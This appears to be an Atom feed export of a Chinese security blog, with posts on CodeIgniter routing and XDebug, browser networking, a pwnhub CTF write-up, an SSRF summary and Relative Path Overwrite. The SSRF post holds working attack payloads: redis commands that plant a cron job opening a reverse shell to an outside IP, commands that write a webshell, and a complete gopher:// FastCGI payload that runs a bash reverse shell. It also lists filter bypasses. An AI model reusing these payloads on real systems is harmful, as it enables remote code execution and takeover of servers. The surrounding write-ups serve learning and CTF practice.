    <published>2017-05-01T16:21:30.000Z</published>
    <updated>2017-05-01T16:22:24.538Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CI路由分析"><a href="#CI路由分析" class="headerlink" title="CI路由分析"></a>CI路由分析</h1><hr>
<h2 id="入口文件index-php"><a href="#入口文件index-php" class="headerlink" title="入口文件index.php"></a>入口文件index.php</h2><p>index.php主要是定义环境路径等变量最后加载<strong>核心</strong>文件CodeIgniter.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require_once</span> BASEPATH.<span class="string">'core/CodeIgniter.php'</span>;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="CodeIgniter-php"><a href="#CodeIgniter-php" class="headerlink" title="CodeIgniter.php"></a>CodeIgniter.php</h2><p>CodeIgniter.php内加载各种核心文件其中关于路由的有</p>
<ul>
<li>加载 <code>system/core/URI.php</code> URI类帮助你解析请求的uri并提供分割uri的函数集合供Router类使用</li>
<li>加载 <code>system/core/Router.php</code>  路由类即通过请求的uri和用户配置的路由(application/config/routes.php)将用户请求分发到指定的Controller实例中某一action函数中</li>
</ul>
<h2 id="URI-php"><a href="#URI-php" class="headerlink" title="URI.php"></a>URI.php</h2><p>在CodeIgniter.php先调用了URI.php其中函数<code>_parse_request_uri()</code>获取URI并进行分割</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$uri = parse_url(<span class="string">'http://dummy'</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]);</div><div class="line"><span class="comment">//$_SERVER['REQUEST_URI'] 获得形如/index.php/aaa/bbb/ccc的字符串aaa为控制器bbb为函数ccc为参数拼接成url后使用parse_url()解析</span></div><div class="line">$query = <span class="keyword">isset</span>($uri[<span class="string">'query'</span>]) ? $uri[<span class="string">'query'</span>] : <span class="string">''</span>;</div><div class="line">$uri = <span class="keyword">isset</span>($uri[<span class="string">'path'</span>]) ? $uri[<span class="string">'path'</span>] : <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'SCRIPT_NAME'</span>][<span class="number">0</span>]))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (strpos($uri, $_SERVER[<span class="string">'SCRIPT_NAME'</span>]) === <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">$uri = (string) substr($uri, strlen($_SERVER[<span class="string">'SCRIPT_NAME'</span>]));</div><div class="line">&#125;</div><div class="line"><span class="keyword">elseif</span> (strpos($uri, dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>])) === <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">$uri = (string) substr($uri, strlen(dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>])));</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//除去/index.php此时uri为'/aaa/bbb/ccc'</span></div></pre></td></tr></table></figure>
<p>而后进入函数<code>_set_uri_string()</code>将每个段分割存入<code>segments</code>数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> (explode(<span class="string">'/'</span>, trim(<span class="keyword">$this</span>-&gt;uri_string, <span class="string">'/'</span>)) <span class="keyword">as</span> $val)</div><div class="line">&#123;</div><div class="line">$val = trim($val);</div><div class="line"><span class="comment">// Filter segments for security</span></div><div class="line"><span class="keyword">$this</span>-&gt;filter_uri($val);</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($val !== <span class="string">''</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;segments[] = $val;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Router-php"><a href="#Router-php" class="headerlink" title="Router.php"></a>Router.php</h2><p>而后调用Router.php进入函数<code>_set_routing()</code>配置路由的config之后进入函数<code>_set_request()</code>经过函数<code>_validate_request()</code>验证合法性后将segments数组中的第一第二元素分别设置为class和method</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;set_class($segments[<span class="number">0</span>]);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($segments[<span class="number">1</span>]))</div><div class="line">&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;set_method($segments[<span class="number">1</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">$segments[<span class="number">1</span>] = <span class="string">'index'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="回到CodeIgniter-php"><a href="#回到CodeIgniter-php" class="headerlink" title="回到CodeIgniter.php"></a>回到CodeIgniter.php</h2><p>第411行包含class中的变量的php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require_once</span>(APPPATH.<span class="string">'controllers/'</span>.$RTR-&gt;directory.$class.<span class="string">'.php'</span>);</div></pre></td></tr></table></figure>
<p>之后在532行使用调用method对应的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">call_user_func_array(<span class="keyword">array</span>(&amp;$CI, $method), $params);</div></pre></td></tr></table></figure>
<h2 id="XDebug-VSCode"><a href="#XDebug-VSCode" class="headerlink" title="XDebug+VSCode"></a>XDebug+VSCode</h2><p>这两个软件配合可以非常方便的单步调试</p>
<p>如果使用<em>PHPStudy</em>的话直接在<code>PHP拓展及设置</code>中开启<code>Xdebug</code>模式就可以了但是默认的配置中还是要修改一下在<code>php.ini</code>中加上下列代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[XDebug]</div><div class="line">;注释的一般phpstudy已经帮你设置好了</div><div class="line">;xdebug.profiler_output_dir =<span class="string">""</span></div><div class="line">;xdebug.trace_output_dir =<span class="string">""</span></div><div class="line">;zend_extension=<span class="string">"path\to\xdebug.dll"</span> </div><div class="line"></div><div class="line">xdebug.profiler_append = <span class="number">0</span></div><div class="line">xdebug.profiler_enable = <span class="number">1</span></div><div class="line">xdebug.profiler_enable_trigger = <span class="number">0</span></div><div class="line">xdebug.profiler_output_name = <span class="string">"cache.out.%t-%s"</span></div><div class="line">xdebug.remote_handler = <span class="string">"dbgp"</span></div><div class="line">xdebug.remote_host = <span class="string">"127.0.0.1"</span></div><div class="line">;xdebug.remote_connect_back = <span class="number">1</span> <span class="comment">// this setting must be setting with xdebug.remote_addr_header</span></div><div class="line">xdebug.remote_enable = <span class="number">1</span></div><div class="line">xdebug.remote_autostart = <span class="number">1</span></div></pre></td></tr></table></figure>
<p><a href="https://xdebug.org/docs/all_settings" target="_blank" rel="external">XDebug_all_setting</a></p>
<p>在VSCode中下载拓展PHP-Debug</p>
<p>配置launch.json</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</div><div class="line">    <span class="attr">"configurations"</span>: [</div><div class="line">        &#123;</div><div class="line">            <span class="attr">"name"</span>: <span class="string">"Listen for XDebug"</span>,</div><div class="line">            <span class="attr">"type"</span>: <span class="string">"php"</span>,</div><div class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>,</div><div class="line">            <span class="attr">"serverSourceRoot"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>, </div><div class="line">            <span class="attr">"localSourceRoot"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>, </div><div class="line">            <span class="attr">"stopOnEntry"</span>: <span class="literal">false</span>, </div><div class="line">            <span class="attr">"log"</span>: <span class="literal">false</span>, </div><div class="line">            <span class="attr">"port"</span>: <span class="number">9000</span></div><div class="line">        &#125;,</div><div class="line">        &#123;</div><div class="line">            <span class="attr">"name"</span>: <span class="string">"Launch currently open script"</span>,</div><div class="line">            <span class="attr">"type"</span>: <span class="string">"php"</span>,</div><div class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>,</div><div class="line">            <span class="attr">"program"</span>: <span class="string">"D:/Code/Web/phpstudy/php55n/php.exe"</span>, </div><div class="line">            <span class="attr">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>,</div><div class="line">            <span class="attr">"port"</span>: <span class="number">8080</span> </div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CI路由分析&quot;&gt;&lt;a href=&quot;#CI路由分析&quot; class=&quot;headerlink&quot; title=&quot;CI路由分析&quot;&gt;&lt;/a&gt;CI路由分析&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;入口文件index-php&quot;&gt;&lt;a href=&quot;#入口文件index-php&quot; class=&quot;headerlink&quot; title=&quot;入口文件index.php&quot;&gt;&lt;/a&gt;入口文件index.php&lt;/h2&gt;&lt;p&gt;index.php主要是定义环境路径等变量最后加载&lt;strong&gt;核心&lt;/strong&gt;文件CodeIgniter.php&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;require_once&lt;/span&gt; BASEPATH.&lt;span class=&quot;string&quot;&gt;&#39;core/CodeIgniter.php&#39;&lt;/span&gt;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>what happen</title>
    <link href="https://5eafood.github.io/2017/03/31/what-happen/"/>
    <id>https://5eafood.github.io/2017/03/31/what-happen/</id>
    <published>2017-03-30T17:15:49.000Z</published>
    <updated>2017-03-30T17:18:53.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="当我们访问google时发生了什么"><a href="#当我们访问google时发生了什么" class="headerlink" title="当我们访问google时发生了什么"></a>当我们访问google时发生了什么</h1><p>在微博上看到的万能面试题”当你在浏览器中输入 www.google.com 并且按下回车之后发生了什么”我写一下自己的理解仅与网络相关的内容<br><a id="more"></a></p>
<h2 id="url解析"><a href="#url解析" class="headerlink" title="url解析"></a>url解析</h2><p>浏览器通过正则解析url判断URL是否合法对于非法URL现代浏览器会将之传递给搜索引擎对于中文域名浏览器会进行punycode编码</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>浏览器将接收到的url中抽取出域名字段就是访问的主机名</p>
<ol>
<li>首先浏览器会优先检查自己缓存中是否存在域名对应的ip如果不存在则进入下一步</li>
<li>检查hosts文件中是否有域名对应的IP如果不存在进入下一步</li>
<li>一些路由器也会缓存域名信息路由器会在其中检查以上三步为客户端的dns缓存</li>
<li>终端向本地DNS发出域名解析请求本地DNS通常由网络提供商例如电信提供或则可以手工设定为类似谷歌提供的8.8.8.8公共DNS本地dns作为代理向权威服务器请求域名信息DNS请求通常为UDP格式但在长度过长时会改用TCP格式</li>
<li>本地DNS检查自身缓存中是否存在对应的域名信息若不存在则向13台根域名服务器发起域名解析请求如果域名为<strong>www.google.com</strong>则向<strong>com</strong>域名服务器发出请求之后将会得到<strong>google.com</strong>二级域名服务器的地址</li>
<li>本地DNS继续向<strong>google.com</strong>二级域名服务器发起解析请求并最终获得了<strong>www.google.com</strong>的IP地址信息</li>
<li>本地DNS将查询获得的IP地址信息缓存并返回给客户端 </li>
</ol>
<h3 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h3><ol>
<li>入侵路由器更改本地DNS使其指向黑客的DNS服务器返回错误的ip得以劫持域名</li>
<li>直接入侵DNS服务器修改缓存</li>
<li>利用dns请求为udp的特点在真实DNS请求返回前给受害者发送一个伪造的DNS解析响应</li>
</ol>
<h3 id="dns-rebinding-攻击"><a href="#dns-rebinding-攻击" class="headerlink" title="dns rebinding 攻击"></a>dns rebinding 攻击</h3><p>本地DNS服务器的缓存存在时限即TTL(Time- To-Live)<br>假设我们要获得受害者在<strong>www.b.com/secret.php</strong> 下的内容            </p>
<ol>
<li>我们设置我们的域名ttl为1分钟(极短的时间)</li>
<li>诱导受害者访问<strong>www.a.com/evil.html</strong>并让他等待1分钟以上</li>
<li>之后我们将<strong>www.a.com</strong>绑定到<strong>www.b.com</strong>的ip上</li>
<li>利用js在ttl时间过后使受害者访问 <strong>www.a.com/secret.php</strong>实际上js访问的使<strong>www.b.com/secret.php</strong>,使用js弹回页面内容<br>还有其他的利用方式例如配合其他漏洞绕过ip限制</li>
</ol>
<h2 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h2><p>TLS是为了HTTPS的使用并不是每个网站都需要目前google已全面使用HTTPS      </p>
<ol>
<li>客户端发送一个<strong>Client hello</strong>消息到服务器端消息中同时包含了它的TLS版本 密文族和可用的压缩算法</li>
<li>服务器端向客户端返回一<strong>Server hello</strong>消息消息中包含了服务器端的TLS版本服务器选择了哪个加密和压缩算法以及服务器的公开证书证书中包含了公钥客户端会使用这个公钥加密接下来的握手过程直到协商生成一个新的对称密钥</li>
<li>客户端根据自己的信任CA列表验证服务器端的证书是否有效如果有效客户端会生成一串伪随机数使用服务器的公钥加密它这串随机数会被用于生成新的对称密钥</li>
<li>服务器端使用自己的私钥解密上面提到的随机数然后使用这串随机数生成自己的对称主密钥</li>
<li>客户端发送一个<strong>Finished</strong>消息给服务器端使用对称密钥加密这次通讯的一个散列值</li>
<li>服务器端生成自己的 hash 值然后解密客户端发送来的信息检查这两个值是否对应如果对应就向客户端发送一个<strong>Finished</strong>消息也使用协商好的对称密钥加密</li>
<li>从现在开始接下来整个 TLS 会话都使用对称秘钥进行加密传输应用层HTTP内容</li>
</ol>
<h3 id="中间人劫持"><a href="#中间人劫持" class="headerlink" title="中间人劫持"></a>中间人劫持</h3><p>https无法直接被中间人攻击但如果网站没有强制用户使用HTTPS黑客可以利用<strong>SSLStrip</strong>进行中间人攻击将https转换为http从而劫持成功同样的方法可以配合上文的DNS劫持一同使用因为域名解析先于TLS握手</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>http基于tcp/ip协议在浏览器的到域名的ip和端口后浏览器会以一个随机端口向服务器发起tcp的三次握手</p>
<h3 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h3><p>TCP中控制位由6个标志比特构成其中SYN代表请求建立连接ACK代表确认序列号有效</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. client发出连接请求控制位中的ACK=0SYN=1根据算法生成SYN数据段的序列号seq=x而后进入SYN_SENT状态等待server响应</div><div class="line">2. server监听收到连接请求后若同意连接则向client发送确认ACK=1SYN=1算法生成SYN数据段的序列号seq=yACK的确认序列号为ack=x+1server进入SYN_RECV状态</div><div class="line">3. client将SYN=0,ACK=1,seq=x+1,ack=y+1发送给server而后两者都进入ESTABLISHED状态完成TCP三次握手</div><div class="line">4. server每发送一次数据seq=seq+1client返回ack=seq+1(如果请求头中没有keep-alive则发送一次数据后连接断开)</div><div class="line">5. 服务器关闭TCP连接发送一个FINclient确认FIN返回一个ACK为收到序列号+1发送自己的FIN并关闭数据传送server发送ACK为收到序列号+1之后彻底关闭</div></pre></td></tr></table></figure>
<p>在TCP握手的第二步存在缺陷攻击者可以发送大量SYN连接请求消耗服务器资源即SYN Flood攻击为了解决这个问题需要引入SYN cookie</p>
<p>在收到SYN请求后服务器不分配缓冲区使用IP等连接信息生成cookie作为序列号返回给client客户端发送ack包后重新计算cookie与返回值确认后再分配资源</p>
<p>tcp连接建立后浏览器会生成请求报文其中包括http的协议版本请求的方法hostuser-agent编码方式压缩方式等部分浏览器还支持谷歌的SPDY协议他会对HTTP的头部进行压缩以及其他优化加快载入速度</p>
<p>浏览器发出http请求后接收的服务器应该为代理服务器代理服务器将请求转发给真正的服务器并把响应结果返回给浏览器</p>
<p>浏览器收到响应后前端会进行渲染加载js和css文件个人对前端了解不多就不乱写了</p>
<h2 id="网络传输过程"><a href="#网络传输过程" class="headerlink" title="网络传输过程"></a>网络传输过程</h2><ol>
<li>若双方在同一子网想要互相连接需要对方的MAC地址这时候就需要<code>ARPAddress Resolution Protocol</code>arp的作用是提供IP与MAC地址的映射关系发起连接请求的一方先检查自身的arp表中是否有对应的映射关系若不存在则发出ARP广播请求对应IP的主机响应对应主机收到ARP广播后返回它的MAC地址之后建立通信显然任何主机都能响应ARP广播如果恶意响应ARP广播返回错误的MAC地址即可进行ARP欺骗攻击</li>
<li>若双方不在同一子网则向网关发起请求在此之前要有网关的MAC方法如上路由会一层一层的寻找通信对象之后返回一个最短的路径</li>
<li>通常电信运营商会使用<code>NAT(Network Address Translation)</code>技术当用户向互联网发出连接时从IP池中分配给用户一个外网IP和端口用于通信</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;当我们访问google时发生了什么&quot;&gt;&lt;a href=&quot;#当我们访问google时发生了什么&quot; class=&quot;headerlink&quot; title=&quot;当我们访问google时发生了什么&quot;&gt;&lt;/a&gt;当我们访问google时发生了什么&lt;/h1&gt;&lt;p&gt;在微博上看到的万能面试题”当你在浏览器中输入 www.google.com 并且按下回车之后发生了什么”我写一下自己的理解仅与网络相关的内容&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwnhub writeup</title>
    <link href="https://5eafood.github.io/2017/03/26/pwnhub-writeup/"/>
    <id>https://5eafood.github.io/2017/03/26/pwnhub-writeup/</id>
    <published>2017-03-26T14:33:21.000Z</published>
    <updated>2017-03-26T14:52:01.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnhub-wp-大物必须过"><a href="#pwnhub-wp-大物必须过" class="headerlink" title="pwnhub wp 大物必须过"></a>pwnhub wp 大物必须过</h1><p>刚看的<strong>RPO (Relative Path Overwrite) 相对路径覆盖</strong>就被人用来出题了蛮放上来凑个数</p>
<a id="more"></a>
<p><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a></p>
<p>原理大概就是利用浏览器和服务器对url编码的解析方式不同当我们访问<code>http://domain/1%2f2.php</code>时服务器会返回<code>http://domain/1/2.php</code>的内容而浏览器则会认为<code>1%2f2.php</code>为一个文件</p>
<p>在这题的<code>52.80.19.55/classes.php</code>下是这样引入css的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"../../classes.css"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>如果我们访问<code>http://52.80.19.55/user.php/341/a/b/..%2f..%2f..%2f..%2fclasses.php</code></p>
<p>服务器返回的是<code>http://52.80.19.55/classes.php</code></p>
<p>而浏览器认为<code>..%2f..%2f..%2f..%2fclasses.php</code>是一个文件则引入的css是</p>
<p><code>http://52.80.19.55/user.php/341/classes.css</code>即<code>http://52.80.19.55/user.php/341</code></p>
<p>我们只要注册时在Your study vow里写上我们要执行的css<code>{}*{background-image:url(url)}</code>然后把上面的url通过bug report发出去之后收到的头里就有flag了<del>忘记截图了</del></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;pwnhub-wp-大物必须过&quot;&gt;&lt;a href=&quot;#pwnhub-wp-大物必须过&quot; class=&quot;headerlink&quot; title=&quot;pwnhub wp 大物必须过&quot;&gt;&lt;/a&gt;pwnhub wp 大物必须过&lt;/h1&gt;&lt;p&gt;刚看的&lt;strong&gt;RPO (Relative Path Overwrite) 相对路径覆盖&lt;/strong&gt;就被人用来出题了蛮放上来凑个数&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="https://5eafood.github.io/2017/03/26/ssrf/"/>
    <id>https://5eafood.github.io/2017/03/26/ssrf/</id>
    <published>2017-03-26T14:29:23.000Z</published>
    <updated>2017-03-26T14:51:38.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf小结"><a href="#ssrf小结" class="headerlink" title="ssrf小结"></a>ssrf小结</h1><a id="more"></a>
<hr>
<h2 id="ssrf的发现"><a href="#ssrf的发现" class="headerlink" title="ssrf的发现"></a>ssrf的发现</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">file_get_contents()  默认不支持gopher等协议</div><div class="line">fsockopen() 极少使用</div><div class="line">curl_exec() 默认不会<span class="number">302</span>跳转 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);可开启转跳</div></pre></td></tr></table></figure>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">requests 不支持gopher等协议</div><div class="line">urllib 不支持gopher等协议 存在http头注入的漏洞</div><div class="line">pycurl 同curl_exec 默认支持gopher等协议但默认不支持302跳转 c.setopt(c.FOLLOWLOCATION, 1)开启转跳</div></pre></td></tr></table></figure>
<p>黑盒测试时若无回显且状态码无变化我在测试学校的discuz论坛时无论是否存在端口状态码都为200可以利用<strong>ftp://</strong>连接测试是否存在ssrf若端口存在则触发ftp连接长时间后触发超时断开若不存在则快速断开</p>
<h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>gopher协议支持url编码所以可以传输换行符等字符       </p>
<p>利用gopher协议可以模拟redis命令通过redis向服务器写文件</p>
<p><a href="http://redisbook.com/preview/server/execute_command.html" target="_blank" rel="external">http://redisbook.com/preview/server/execute_command.html</a></p>
<h3 id="写cron"><a href="#写cron" class="headerlink" title="写cron"></a>写cron</h3><p>redis命令为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h $1 flushall</div><div class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</div><div class="line">redis-cli -h $1 config set dir /var/spool/cron/</div><div class="line">redis-cli -h $1 config set dbfilename root</div><div class="line">redis-cli -h $1 save</div></pre></td></tr></table></figure>
<p>可以通过抓取redis-cli和redis服务交互的数据流在url编码后构成gopher协议支持的exp</p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>在知道web路径时可以通过redis直接写webshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /home/wwwroot/default/</div><div class="line">config set dbfilename redis.php</div><div class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
<h3 id="写全局变量或session"><a href="#写全局变量或session" class="headerlink" title="写全局变量或session"></a>写全局变量或session</h3><p>redis和memccached常常用来存放全局变量和session可以通过gopher模拟命令更改全局变量和session值进行攻击</p>
<p><a href="http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&amp;mid=2247483798&amp;idx=1&amp;sn=65cdf852dffd63b9d4ec41c31d9a5365" target="_blank" rel="external">http://mp.weixin.qq.com/s?__biz=MzI0NjQxODg0Ng==&amp;mid=2247483798&amp;idx=1&amp;sn=65cdf852dffd63b9d4ec41c31d9a5365</a></p>
<h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><p><a href="http://www.lijiejie.com/fastcgi-read-file-vulnerability-scan-py/" target="_blank" rel="external">http://www.lijiejie.com/fastcgi-read-file-vulnerability-scan-py/</a> </p>
<p>fcgi_exp可以攻击fastcgi但fastcgi通常不对外网开发故可以通过ssrf+gopher攻击内网的fastcgi</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</div></pre></td></tr></table></figure>
<h2 id="绕过ssrf过滤"><a href="#绕过ssrf过滤" class="headerlink" title="绕过ssrf过滤"></a>绕过ssrf过滤</h2><ul>
<li>利用302转跳首先让网站访问一个正常的外网利用<code>header(&quot;Location: $scheme://$ip:$port/$data&quot;);</code>转跳至内网</li>
<li>访问<code>http://127.0.0.1.xip.io</code>会被解析到<code>http://127.0.0.1</code></li>
<li>十进制ip</li>
<li>DNS重绑定有些ssrf检查会先检查域名解析的ip是否合法之后在访问这之间有两次域名解析可将DNS的ttl设为0这样本地DNS就不会缓存ipDNS在两次域名解析时返回不同的ip第一次合法第二次非法从而绕过保护</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ssrf小结&quot;&gt;&lt;a href=&quot;#ssrf小结&quot; class=&quot;headerlink&quot; title=&quot;ssrf小结&quot;&gt;&lt;/a&gt;ssrf小结&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RPO (Relative Path Overwrite) 相对路径覆盖</title>
    <link href="https://5eafood.github.io/2017/03/22/RPO/"/>
    <id>https://5eafood.github.io/2017/03/22/RPO/</id>
    <published>2017-03-22T15:14:48.000Z</published>
    <updated>2017-03-22T18:44:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RPO-Relative-Path-Overwrite-相对路径覆盖"><a href="#RPO-Relative-Path-Overwrite-相对路径覆盖" class="headerlink" title="RPO (Relative Path Overwrite) 相对路径覆盖"></a>RPO (Relative Path Overwrite) 相对路径覆盖</h1><hr>
<h2 id="什么RPO"><a href="#什么RPO" class="headerlink" title="什么RPO"></a>什么RPO</h2><p>RPO就是一种利用服务端与浏览器之间对 <strong>url编码</strong> 的处理方式不同所发起的攻击<br>可以导致Web页面引入非法的css文件和javascript文件导致xss<br><a id="more"></a></p>
<h2 id="RPO的原理"><a href="#RPO的原理" class="headerlink" title="RPO的原理"></a>RPO的原理</h2><p>我们访问<code>http://127.0.0.1/rpo/1/2/4/example.php</code>, 当页面以这种方式引入css或js文件时<br><code>&lt;link href=&quot;../../style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</code><br>浏览器加载的是<code>http://127.0.0.1/rpo/1/style.css</code>         </p>
<p>但如果将url改为<code>http://127.0.0.1/rpo/1%2f2/4/example.php</code>,服务器会解码%2f为’/‘<br>继续访问<code>http://127.0.0.1/rpo/1/2/4/example.php</code>而浏览器这会将<code>/1%2f2/</code>最为一段路径<br>加载<code>http://127.0.0.1/rpo/style.css</code></p>
<p>利用RPO需要Web页面以<strong>相对路径</strong>的css或js文件<br>需要注意的是apache要开启url自动解码需要在配置文件中加入<code>AllowEncodedSlashes On</code></p>
